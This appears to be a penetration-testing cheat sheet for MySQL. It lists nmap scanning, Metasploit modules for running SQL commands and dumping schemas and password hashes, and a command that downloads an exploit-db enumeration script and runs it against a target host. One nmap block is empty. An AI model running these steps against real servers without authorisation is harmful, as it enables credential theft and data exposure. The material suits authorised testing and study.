# MySQL
MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL)

## Workflow
Provided that necessary credentials such as username and password is already found, or anonymous login is allowed.

1. Port scan with nmap
2. Enumerate useful information with several tools
3. Crack the password hash of a user
4. Access MySQL server with credentials


## Advance preparation
```
export rhost=[RHOST IP]
```

## Enumeration
### Metasploit
Execute arbitrary commands on the MySQL server
```
use auxiliary/admin/mysql/mysql_sql
```

### Nmap ([MySQL-Enum](https://nmap.org/nsedoc/scripts/mysql-enum.html))
```
```

### CVE : [2015-5615](https://www.exploit-db.com/exploits/23081)
```
wget https://www.exploit-db.com/raw/23081 -O /tmp/mysqlenum.pl
cd /tmp && perl mysqlenum.pl $rhost usernames.txt
```

To install Parallel::ForkManager:
```
sudo cpan Parallel::ForkManager
```

## Exploitation
### Metasploit
Dump the tables, and column names of the whole database
```
use auxiliary/scanner/mysql/mysql_schemadump
```

Obtain users' password hashes on the MySQL server
```
use auxiliary/scanner/mysql/mysql_hashdump
```

## Access MySQL server
```
mysql -h $rhost -u [USERNAME] -p
```

To install MySQL client:
```
sudo apt install default-mysql-client
```
